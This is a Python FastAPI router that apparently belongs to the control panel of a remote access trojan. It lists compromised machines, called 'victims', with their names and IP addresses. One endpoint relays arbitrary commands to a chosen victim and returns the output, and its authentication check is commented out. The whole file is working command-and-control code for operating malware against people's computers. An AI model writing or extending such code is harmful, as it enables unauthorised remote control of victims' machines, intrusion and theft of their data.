from fastapi import Depends, APIRouter
from auth.dependencies import *
from models.user import User
from host.server import RAT_SERVER
import urllib.parse

app = APIRouter()


@app.get("/clients")
async def read_users_me():

    prettyClients = []
    print(RAT_SERVER.instance.victims)
    for client in RAT_SERVER.instance.victims:
        prettyClients.append(
            {"name": client["Name"], "ip": client["IPv4"], "status": "Online", "uuid": client["ID"]})

    return {"clients": prettyClients}


@app.get("/clients/{id}")
async def read_user_me(id: str):

    for client in RAT_SERVER.instance.victims:
        print(client)
        if client["ID"] == id:
            return {"client": client}

    return {"client": "Not found"}


@app.post("/clients/{id}/command")
async def execute_command(id: str, command_type: str, command: str):
    # if current_user:

    print(f"[*] Received command {command} of type {command_type} for {id}")
    command = urllib.parse.unquote(command)

    for victim in RAT_SERVER.instance.victims:
        if victim["ID"] == id:
            # Now for the client, we want to get the index of our current victim, and get the index relative to the betterVictimsList
            victimIndex = RAT_SERVER.instance.victims.index(victim)

            client = RAT_SERVER.instance.clients[victimIndex]

            print(f"[*] Found client {client}")

            RAT_SERVER.instance.execute(command_type, command, client[0])
            output = RAT_SERVER.instance.receive_output(client[0])

            if output is None:
                return {"output": "Error: Output not received"}
            return {"output": output}
    return {"output": "Error: Client not found"}
